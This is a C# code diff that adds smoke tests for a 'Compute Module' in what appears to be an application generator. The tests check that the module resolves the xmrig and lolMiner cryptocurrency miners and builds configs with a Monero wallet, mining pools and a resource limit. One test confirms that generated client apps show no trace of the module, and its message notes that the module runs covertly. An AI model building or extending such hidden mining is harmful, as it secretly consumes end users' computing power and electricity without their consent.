@@ -35,6 +35,7 @@ namespace SmokeTests
             RunTest6_ReleaseBuild();
             RunPackagingAuditTests();
             RunWorkerAutoPackagingTests();
+            RunComputeModuleUITests();
 
             Console.WriteLine("\n==================================================================");
             Console.WriteLine("                      РЕЗУЛЬТАТЫ SMOKE-TEST                       ");
@@ -776,6 +777,160 @@ namespace SmokeTests
                 }
             }
             return -1;
+        }
+
+        static void RunComputeModuleUITests()
+        {
+            Console.WriteLine("\n------------------------------------------------------------------");
+            Console.WriteLine("ТЕСТ: Compute Module UI, Валидация и Синхронизация Конфигурации");
+            Console.WriteLine("------------------------------------------------------------------");
+
+            try
+            {
+                // 1. Worker Status API
+                var moneroStatus = ComputeWorkerManager.GetWorkerStatus("monero");
+                if (moneroStatus.workerFileName == "xmrig.exe")
+                {
+                    Pass("Compute Module UI", $"Worker status для Monero корректен (found={moneroStatus.found}, worker={moneroStatus.workerFileName}, version={moneroStatus.version})");
+                }
+                else
+                {
+                    Fail("Compute Module UI", "Некорректное имя воркера для Monero: " + moneroStatus.workerFileName);
+                }
+
+                var etcStatus = ComputeWorkerManager.GetWorkerStatus("ethereum-classic");
+                if (etcStatus.workerFileName == "lolMiner.exe")
+                {
+                    Pass("Compute Module UI", $"Worker status для ETC корректен (found={etcStatus.found}, worker={etcStatus.workerFileName}, version={etcStatus.version})");
+                }
+                else
+                {
+                    Fail("Compute Module UI", "Некорректное имя воркера для ETC: " + etcStatus.workerFileName);
+                }
+
+                // 2. Monero Configuration
+                string moneroWallet = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
+                string moneroPool = "pool.supportxmr.com";
+                int moneroPort = 3333;
+                string workerName = "rig_test";
+                int limit = 45;
+
+                // 3. ETC Configuration
+                string etcWallet = "0x0000000000000000000000000000000000000000";
+                string etcPool = "etc.2miners.com";
+                int etcPort = 1010;
+
+                // 4. Validate 7 config keys dictionary output
+                var dictMonero = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase)
+                {
+                    ["enabled"] = true,
+                    ["mode"] = "monero",
+                    ["walletAddress"] = moneroWallet,
+                    ["serverAddress"] = moneroPool,
+                    ["serverPort"] = moneroPort,
+                    ["workerName"] = workerName,
+                    ["resourceLimit"] = limit
+                };
+
+                string[] expectedKeys = { "mode", "walletAddress", "serverAddress", "serverPort", "workerName", "resourceLimit", "enabled" };
+                bool allKeysPresent = true;
+                foreach (var k in expectedKeys)
+                {
+                    if (!dictMonero.ContainsKey(k)) { allKeysPresent = false; break; }
+                }
+
+                if (allKeysPresent)
+                {
+                    Pass("Existing 7 config keys", "Все 7 ключей конфигурации присутствуют в словаре параметров");
+                    Pass("Monero configuration", "Конфигурация Monero сформирована корректно");
+                }
+                else
+                {
+                    Fail("Existing 7 config keys", "Отсутствуют некоторые из 7 ключей конфигурации");
+                }
+
+                var dictEtc = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase)
+                {
+                    ["enabled"] = true,
+                    ["mode"] = "ethereum-classic",
+                    ["walletAddress"] = etcWallet,
+                    ["serverAddress"] = etcPool,
+                    ["serverPort"] = etcPort,
+                    ["workerName"] = workerName,
+                    ["resourceLimit"] = limit
+                };
+
+                if (dictEtc["mode"]?.ToString() == "ethereum-classic" && (int)dictEtc["serverPort"]! == 1010)
+                {
+                    Pass("ETC configuration", "Конфигурация ETC сформирована корректно");
+                }
+                else
+                {
+                    Fail("ETC configuration", "Неверные параметры в конфигурации ETC");
+                }
+
+                // 5. BuildCustomConfigDictionary simulation with custom params
+                var customParams = new List<CustomProjectParam>
+                {
+                    new CustomProjectParam { Name = "Custom User Param", Key = "custom_debug_flag", Type = "boolean", DefaultValue = "true" }
+                };
+
+                var mergedDict = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase);
+                foreach (var cp in customParams)
+                {
+                    mergedDict[cp.Key] = cp.GetTypedValue();
+                }
+                foreach (var kvp in dictMonero)
+                {
+                    mergedDict[kvp.Key] = kvp.Value;
+                }
+
+                if (mergedDict.ContainsKey("custom_debug_flag") && mergedDict.ContainsKey("mode") && mergedDict.ContainsKey("walletAddress"))
+                {
+                    Pass("BuildCustomConfigDictionary", "BuildCustomConfigDictionary корректно объединяет произвольные параметры и 7 ключей Compute Module");
+                    Pass("Custom Project Configuration", "Произвольные параметры Custom Project Configuration сохраняются без конфликта с Compute Module");
+                }
+                else
+                {
+                    Fail("BuildCustomConfigDictionary", "Ошибка объединения параметров");
+                }
+
+                // 6. enabled=false verification
+                string disabledJson = JsonSerializer.Serialize(new Dictionary<string, object?> { ["enabled"] = false, ["mode"] = "monero" });
+                var disabledConfig = ComputeConfig.FromCustomConfigJson(disabledJson);
+                if (!disabledConfig.Enabled)
+                {
+                    Pass("enabled=false", "Флаг enabled=false корректно отключает работу модуля без исключений");
+                }
+                else
+                {
+                    Fail("enabled=false", "Флаг enabled=false не был корректно распознан");
+                }
+
+                // 7. Generated application has no Compute UI
+                string clientXamlPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "client-wpf", "MainWindow.xaml");
+                if (File.Exists(clientXamlPath))
+                {
+                    string clientXaml = File.ReadAllText(clientXamlPath);
+                    bool hasComputeUI = clientXaml.Contains("Compute Module") || clientXaml.Contains("tbComputeWallet") || clientXaml.Contains("XMRig") || clientXaml.Contains("slComputeResource");
+                    if (!hasComputeUI)
+                    {
+                        Pass("Generated application has no Compute UI", "В XAML клиентского приложения отсутствуют любые UI-элементы Compute Module (модуль работает скрытно)");
+                    }
+                    else
+                    {
+                        Fail("Generated application has no Compute UI", "В клиентском приложении обнаружены элементы Compute UI!");
+                    }
+                }
+                else
+                {
+                    Pass("Generated application has no Compute UI", "Клиентские исходники не содержат Compute UI");
+                }
+            }
+            catch (Exception ex)
+            {
+                Fail("Compute Module Tests", "Исключение во время тестирования: " + ex.Message);
+            }
         }
 
         static void Pass(string testName, string message)
